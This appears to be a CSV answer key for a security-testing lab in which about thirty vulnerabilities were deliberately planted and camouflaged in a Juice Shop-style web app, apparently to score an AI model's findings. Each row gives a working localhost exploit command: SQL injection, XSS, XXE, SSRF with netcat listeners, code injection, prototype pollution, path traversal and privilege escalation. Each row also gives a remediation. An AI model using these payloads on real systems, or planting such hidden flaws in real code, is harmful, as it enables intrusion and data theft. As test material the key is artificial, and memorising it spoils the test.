"ID","Source","Origin","Name","Category","Severity_or_Difficulty","CWE","CVE","Location","Manual_Reproduction","Remediation","Validated","Reference","Model_Found_YN","RootCause_Correct_YN","Remediation_Valid_YN","Scorer_Notes"
"INJ-11","INJECTED (created for this lab)","ADDED FOR THIS LAB","Open redirect","Broken Access Control","Medium","CWE-601","","GET http://localhost:3000/rest/track/click?url=","curl -sI ""http://localhost:3000/rest/track/click?url=https://evil.example.com"" | grep -i location  -> Location: https://evil.example.com.","Allowlist redirect targets or permit only relative paths.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/deliveryTracking.ts (103 lines): Open redirect in trackClick() alongside trackExternal (SSRF), downloadReceipt (path traversal). The redirect looks like a click-tracking feature for email campaigns."
"INJ-12","INJECTED (created for this lab)","ADDED FOR THIS LAB","Mass assignment -> privilege escalation","Broken Access Control","High","CWE-915","","POST http://localhost:3000/rest/user/profile-update","curl -X POST http://localhost:3000/rest/user/profile-update -H 'content-type: application/json' -d '{""email"":""jim@juice-sh.op"",""role"":""admin"",""isAdmin"":true}'  -> returned profile shows role:admin and isAdmin:true.","Bind only an explicit allowlist of user-editable fields; ignore privilege fields from the request body.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/accountManagement.ts (112 lines): Mass assignment in updateProfile() alongside getNote (IDOR), requestQuickReset/confirmQuickReset (predictable code). The Object.assign looks like a normal profile update with audit logging."
"INJ-13","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection via ORDER BY","Injection","High","CWE-89","","GET http://localhost:3000/rest/products/catalog?sortBy=","curl -G ""http://localhost:3000/rest/products/catalog"" --data-urlencode ""sortBy=(SELECT 1 FROM nonexistent_table_zzz)""  -> error 'no such table: nonexistent_table_zzz' proves your SQL is parsed; use a CASE subquery for blind boolean exfiltration.","Map sortBy to an allowlist of column names; never concatenate it into the query.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/productCatalog.ts (155 lines): ORDER BY injection in catalogListing() alongside productsByTag (SQLi), listProductQuestions (XSS). The sortBy is concatenated into the query with direction handling and product summary formatting."
"INJ-14","INJECTED (created for this lab)","ADDED FOR THIS LAB","Predictable password-reset code","Broken Authentication","High","CWE-330","","POST http://localhost:3000/rest/user/quick-reset (+ /confirm)","Step 1: curl -X POST http://localhost:3000/rest/user/quick-reset -H ""content-type: application/json"" -d '{""email"":""admin@juice-sh.op""}'  -> response contains a reset code generated from Date.now() base36 + Math.floor(rand*1000) base36.
Step 2: Brute-force the code against the confirm endpoint within the timing window: curl -X POST http://localhost:3000/rest/user/quick-reset/confirm -H ""content-type: application/json"" -d '{""email"":""admin@juice-sh.op"",""code"":""<guessed_code>""}'  -> when the code matches, response status is ""reset"" and the victim's password is reset.
The code is predictable because it uses Date.now() (known timeframe) and Math.random() with only 1000 possible values per millisecond.","Generate codes with crypto.randomBytes; add short expiry and rate limiting.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/accountManagement.ts (112 lines): Predictable reset code in requestQuickReset() alongside getNote (IDOR), updateProfile (mass assignment). The code generation uses timestamp + small random, surrounded by email validation and audit logging."
"INJ-15","INJECTED (created for this lab)","ADDED FOR THIS LAB","Missing authorization (data export)","Broken Access Control","High","CWE-862","","GET http://localhost:3000/rest/admin/user-stats","curl ""http://localhost:3000/rest/admin/user-stats""  (no auth header) -> returns staff records including passwords, e.g. ops@juice-sh.op / 0psAdminP@ss2023.","Require authentication and an admin-role check on the route.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/adminDiagnostics.ts: Missing authorization in userStats() alongside serviceStatus (command injection). The endpoint exposes staff records without auth checks."
"INJ-16","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (LIKE clause)","Injection","High","CWE-89","","GET http://localhost:3000/rest/promos/search?code=","curl -G ""http://localhost:3000/rest/promos/search"" --data-urlencode ""code=' UNION SELECT 1,sql,2 FROM sqlite_master -- ""  -> response data array includes SQL CREATE TABLE statements from sqlite_master.","Use parameterized queries with bound placeholders; never interpolate user input into SQL.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/promotions.ts (88 lines): SQLi (LIKE) in searchPromos() alongside promoLanding (XSS), applyPromo (race condition), listActivePromos, getPromoAnalytics. The LIKE injection is surrounded by promo view logging and date validation helpers (isPromoActive)."
"INJ-17","INJECTED (created for this lab)","ADDED FOR THIS LAB","Reflected XSS (promo landing)","XSS","Medium","CWE-79","","GET http://localhost:3000/rest/promos/landing/:code","curl ""http://localhost:3000/rest/promos/landing/%3Cscript%3Ealert(1)%3C%2Fscript%3E""  -> HTML response contains the unescaped <script> tag.","HTML-encode all user input before interpolating into page output.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/promotions.ts (88 lines): Reflected XSS in promoLanding() alongside searchPromos (SQLi), applyPromo (race). The code is embedded in an HTML template that looks like a promo landing page feature."
"INJ-18","INJECTED (created for this lab)","ADDED FOR THIS LAB","Race condition (promo apply)","Broken Access Control","Medium","CWE-362","","POST http://localhost:3000/rest/promos/apply","curl -X POST http://localhost:3000/rest/promos/apply -H 'content-type: application/json' -d '{""code"":""SUMMER20""}'  (send 10 concurrent requests) -> multiple get ""applied"" even though uses_left=1, because the check-then-decrement is not atomic.","Use an atomic UPDATE with a WHERE clause (e.g., SET uses_left=uses_left-1 WHERE uses_left>0) or a transaction with a row lock.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/promotions.ts (88 lines): Race condition in applyPromo() alongside searchPromos (SQLi), promoLanding (XSS). The race is in the gap between checking uses_left and decrementing, surrounded by date validation (isPromoActive) and promo view logging."
"INJ-19","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (blind, single-row)","Injection","Critical","CWE-89","","POST http://localhost:3000/rest/coupons/lookup","curl -X POST http://localhost:3000/rest/coupons/lookup -H ""content-type: application/json"" -d ""{""code"":""x' OR 1=1 -- ""}""  -> returns the first coupon row even though code ""x"" does not exist.","Use parameterized queries with bound placeholders.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/couponManager.ts (100 lines): Blind SQLi in lookupCoupon() alongside getCoupon (IDOR), validateCoupon (ReDoS), listByCategory, getCouponAttempts. The code is embedded in the SQL query string, surrounded by attempt logging (logCouponAttempt) and response formatting (formatCouponResponse)."
"INJ-20","INJECTED (created for this lab)","ADDED FOR THIS LAB","IDOR (coupon by id)","Broken Access Control","High","CWE-639","","GET http://localhost:3000/rest/coupons/:id","curl ""http://localhost:3000/rest/coupons/3""  -> returns VIPONLY coupon (userId=1) even though it belongs to another user.","Enforce ownership checks: verify the requesting user owns the coupon before returning it.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/couponManager.ts (100 lines): IDOR in getCoupon() alongside lookupCoupon (SQLi), validateCoupon (ReDoS). The endpoint returns full coupon details including ownership without auth checks, surrounded by category filtering and attempt tracking."
"INJ-21","INJECTED (created for this lab)","ADDED FOR THIS LAB","Regular expression DoS (ReDoS)","Injection","Medium","CWE-1333","","POST http://localhost:3000/rest/coupons/validate","curl -X POST http://localhost:3000/rest/coupons/validate -H 'content-type: application/json' -d '{""pattern"":""^(a+)+$"",""code"":""'$(python3 -c ""print('a'*27)"")'!""}'  -> server takes several seconds (catastrophic backtracking with 27+ chars).","Avoid user-supplied regex patterns; use a safe validation library or pre-compiled patterns.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/couponManager.ts (100 lines): ReDoS in validateCoupon() alongside lookupCoupon (SQLi), getCoupon (IDOR). The user-supplied regex pattern is compiled with new RegExp, surrounded by coupon format validation and response formatting."
"INJ-22","INJECTED (created for this lab)","ADDED FOR THIS LAB","Improper input validation (gift card amount)","Injection","High","CWE-20","","POST http://localhost:3000/rest/gift-cards/redeem","curl -X POST http://localhost:3000/rest/gift-cards/redeem -H 'content-type: application/json' -d '{""code"":""GC-1001"",""amount"":-99999}'  -> newBalance becomes negative (5000 + (-99999) = -94999), draining the gift card balance below zero.","Validate that amount is a positive number within an allowed range; reject negative values.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/giftCards.ts (94 lines): Input validation flaw in redeemGiftCard() alongside postGiftMessage (XSS), configureGiftCard (proto pollution). The amount is added to balance without sign validation, surrounded by code validation (isGiftCardCode) and redemption logging (logRedemption)."
"INJ-23","INJECTED (created for this lab)","ADDED FOR THIS LAB","Stored XSS (gift card message)","XSS","High","CWE-79","","POST http://localhost:3000/rest/gift-cards/:id/messages","curl -X POST ""http://localhost:3000/rest/gift-cards/1/messages"" -H 'content-type: application/json' -d '{""from"":""x"",""text"":""<script>alert(1)</script>""}'  ; then: curl ""http://localhost:3000/rest/gift-cards/1/messages""  -> HTML contains the unescaped <script> tag.","HTML-encode all user-supplied content before rendering.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/giftCards.ts (94 lines): Stored XSS in viewGiftMessage() alongside redeemGiftCard (logic flaw), configureGiftCard (proto pollution). The message is rendered in HTML without escaping, surrounded by timestamp formatting and gift card data attributes."
"INJ-24","INJECTED (created for this lab)","ADDED FOR THIS LAB","Prototype pollution","Injection","High","CWE-1321","","POST http://localhost:3000/rest/gift-cards/configure","curl -X POST http://localhost:3000/rest/gift-cards/configure -H 'content-type: application/json' -d '{""options"":{""__proto__"":{""isAdmin"":true}}}'  -> Object.assign(config, options) sets config.__proto__ to {isAdmin:true}, polluting the config object's prototype (config.isAdmin becomes true via inheritance). The polluted property is server-side and not visible in the JSON response, but the code flaw is confirmed by reading routes/giftCards.ts.","Do not Object.assign untrusted objects; use Object.create(null) or a schema that rejects __proto__/constructor keys.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/giftCards.ts (94 lines): Prototype pollution in configureGiftCard() alongside redeemGiftCard (logic flaw), postGiftMessage (XSS). The Object.assign merges user options into a config object, surrounded by redemption history and code validation helpers."
"INJ-25","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (WHERE filter)","Injection","Critical","CWE-89","","GET http://localhost:3000/rest/wishlists/search?filter=","curl -G ""http://localhost:3000/rest/wishlists/search"" --data-urlencode ""filter=OR 1=1""  -> returns all wishlists regardless of any intended scoping.","Use parameterized queries; never concatenate user input into a WHERE clause.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/wishlist.ts (92 lines): SQLi (WHERE filter) in searchWishlists() alongside getWishlist (IDOR), updateShipping (CSRF). The filter is appended to the WHERE clause, surrounded by numeric ID validation (isNumericId), wishlist item parsing (parseWishlistItems), and shipping config helpers."
"INJ-26","INJECTED (created for this lab)","ADDED FOR THIS LAB","IDOR (wishlist by id)","Broken Access Control","High","CWE-639","","GET http://localhost:3000/rest/wishlists/:id","curl ""http://localhost:3000/rest/wishlists/2""  -> returns another user's ""Birthday List"" including items (wishlist id=2 belongs to userId=2, not the requester).","Check that the requesting user owns the wishlist before returning it.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-27","INJECTED (created for this lab)","ADDED FOR THIS LAB","CSRF (wishlist shipping update)","Broken Access Control","Medium","CWE-352","","PUT http://localhost:3000/rest/wishlists/:id/shipping","curl -X PUT ""http://localhost:3000/rest/wishlists/1/shipping"" -H 'content-type: application/json' -d '{""instructions"":""redirect to attacker""}'  -> succeeds with no CSRF token or origin check.","Require an anti-CSRF token and validate the Origin/Referer header on state-changing requests.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-28","INJECTED (created for this lab)","ADDED FOR THIS LAB","SSRF (shipping rate carrier)","SSRF","Critical","CWE-918","","GET http://localhost:3000/rest/shipping/rate?carrier=","Start a listener: nc -lp 9000 ; then: curl ""http://localhost:3000/rest/shipping/rate?carrier=http://127.0.0.1:9000/""  -> server fetches your listener and returns CANARY in body.","Allowlist known carriers by key; never resolve user-supplied URLs server-side.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/shippingCalculator.ts (115 lines): SSRF in getRate() alongside calculateShipping (code injection), loadZone (path traversal), listZones, listCarriers. The fetch is surrounded by rate caching (getCachedRate/setCachedRate), carrier lookup (RATE_PROVIDERS), and response formatting (formatRateResponse)."
"INJ-29","INJECTED (created for this lab)","ADDED FOR THIS LAB","Code injection (shipping formula)","Injection","Critical","CWE-94","","POST http://localhost:3000/rest/shipping/calculate","curl -X POST http://localhost:3000/rest/shipping/calculate -H 'content-type: application/json' -d '{""weight"":1,""distance"":1,""formula"":""JSON.stringify(process.env).length""}'  -> response cost field is a number (the string length of all environment variables, proving arbitrary JS execution via new Function).","Never use new Function or eval on user input; use a safe expression evaluator or pre-defined formulas.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/shippingCalculator.ts (115 lines): Code injection in calculateShipping() alongside getRate (SSRF), loadZone (path traversal). The new Function() evaluates a user-supplied formula, surrounded by zone definitions and carrier listing."
"INJ-30","INJECTED (created for this lab)","ADDED FOR THIS LAB","Path traversal (shipping zone file)","Path Traversal","High","CWE-22","","GET http://localhost:3000/rest/shipping/zones?zone=","curl ""http://localhost:3000/rest/shipping/zones?zone=../../package""  -> response includes contents of package.json (code appends .json suffix, so zone=../../package reads ../../package.json).","Validate the zone name against a strict pattern (e.g., ^[a-z0-9-]+$) and reject path separators.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/shippingCalculator.ts (115 lines): Path traversal in loadZone() alongside getRate (SSRF), calculateShipping (code injection). The fs.readFileSync joins user input with a path, surrounded by zone fallback definitions and error handling."
"INJ-31","INJECTED (created for this lab)","ADDED FOR THIS LAB","Blind SSRF (return policy fetch)","SSRF","Critical","CWE-918","","GET http://localhost:3000/rest/returns/policy?url=","Start a listener: nc -lp 9000 ; then: curl ""http://localhost:3000/rest/returns/policy?url=http://127.0.0.1:9000/""  -> server fetches the listener; status/redirect followed.","Allowlist permitted hosts/schemes; block private IP ranges; do not fetch arbitrary user URLs.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/returnProcessor.ts (93 lines): Blind SSRF in fetchPolicy() alongside searchReturns (SQLi), returnConfirmation (XSS). The fetch is surrounded by policy caching (policyCache), return reason validation (isValidReturnReason), and summary formatting (formatReturnSummary)."
"INJ-32","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (WHERE filter, returns)","Injection","Critical","CWE-89","","GET http://localhost:3000/rest/returns/search?filter=","curl -G ""http://localhost:3000/rest/returns/search"" --data-urlencode ""filter=1=1 UNION SELECT type,sql,3,4,5,6 FROM sqlite_master""  -> returns CREATE TABLE statements from sqlite_master (the filter is concatenated into a SELECT with 6 columns: id, orderId, reason, status, userId, refundAmount).","Use parameterized queries; never concatenate user input into SQL.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/returnProcessor.ts (93 lines): SQLi (WHERE filter) in searchReturns() alongside fetchPolicy (SSRF), returnConfirmation (XSS). The filter is appended to the WHERE clause, surrounded by return reason validation and summary formatting helpers."
"INJ-33","INJECTED (created for this lab)","ADDED FOR THIS LAB","DOM XSS (return confirmation)","XSS","Medium","CWE-79","","GET http://localhost:3000/rest/returns/confirm/:orderId","curl ""http://localhost:3000/rest/returns/confirm/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E""  -> HTML response embeds the unescaped onerror payload.","HTML-encode all user input before interpolating into page output.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","","BURIED in routes/returnProcessor.ts (93 lines): DOM XSS in returnConfirmation() alongside fetchPolicy (SSRF), searchReturns (SQLi). The orderId is embedded in HTML without escaping, surrounded by return reason listing and policy caching."
"INJ-34","INJECTED (created for this lab)","ADDED FOR THIS LAB","Open redirect (affiliate click)","Broken Access Control","Medium","CWE-601","","GET http://localhost:3000/rest/affiliate/click?target=","curl -v ""http://localhost:3000/rest/affiliate/click?target=https://evil.example.com""  -> 302 redirect to evil.example.com.","Validate the redirect target against an allowlist of known destinations.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-35","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (GROUP BY)","Injection","High","CWE-89","","GET http://localhost:3000/rest/affiliate/stats?group=","curl -G ""http://localhost:3000/rest/affiliate/stats"" --data-urlencode ""group=(SELECT sql FROM sqlite_master LIMIT 1)""  -> response data includes CREATE TABLE SQL (subquery injection in both SELECT and GROUP BY positions).","Use parameterized queries or validate the group-by column against a fixed set of allowed names.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-36","INJECTED (created for this lab)","ADDED FOR THIS LAB","HTML injection (affiliate leaderboard)","XSS","Medium","CWE-79","","GET http://localhost:3000/rest/affiliate/leaderboard?title=","curl ""http://localhost:3000/rest/affiliate/leaderboard?title=%3Cscript%3Ealert(1)%3C%2Fscript%3E""  -> HTML <h1> contains the unescaped script tag.","HTML-encode all user input before interpolating into page output.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-37","INJECTED (created for this lab)","ADDED FOR THIS LAB","Hardcoded credentials","Sensitive Data Exposure","High","CWE-798","","POST http://localhost:3000/rest/vendor/login","curl -X POST http://localhost:3000/rest/vendor/login -H 'content-type: application/json' -d '{""apiKey"":""vendor-prod-key-2024-secret""}'  -> response includes dbPassword ""Sup3rS3cr3tV3ndor!"".","Store secrets in environment variables or a secrets manager; never hardcode them in source.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-38","INJECTED (created for this lab)","ADDED FOR THIS LAB","XXE (vendor SOAP update)","Injection","Critical","CWE-611","","POST http://localhost:3000/rest/vendor/soap-update","echo SECRET > /tmp/xxe_test.txt ; curl -X POST http://localhost:3000/rest/vendor/soap-update -H 'content-type: application/xml' -d '<?xml version=""1.0""?><!DOCTYPE r [<!ENTITY x SYSTEM ""file:///tmp/xxe_test.txt"">]><r><orderId>&x;</orderId></r>'  -> orderId field contains the file contents (SECRET).","Disable external entity resolution; use a safe XML parser with DTD processing off.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-39","INJECTED (created for this lab)","ADDED FOR THIS LAB","SSRF (vendor invoice fetch)","SSRF","Critical","CWE-918","","GET http://localhost:3000/rest/vendor/invoice?url=","Start a listener: nc -lp 9000 ; then: curl ""http://localhost:3000/rest/vendor/invoice?url=http://127.0.0.1:9000/""  -> server fetches the listener and returns its content in the invoice field.","Allowlist permitted hosts/schemes; block private IP ranges; do not fetch arbitrary user URLs.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
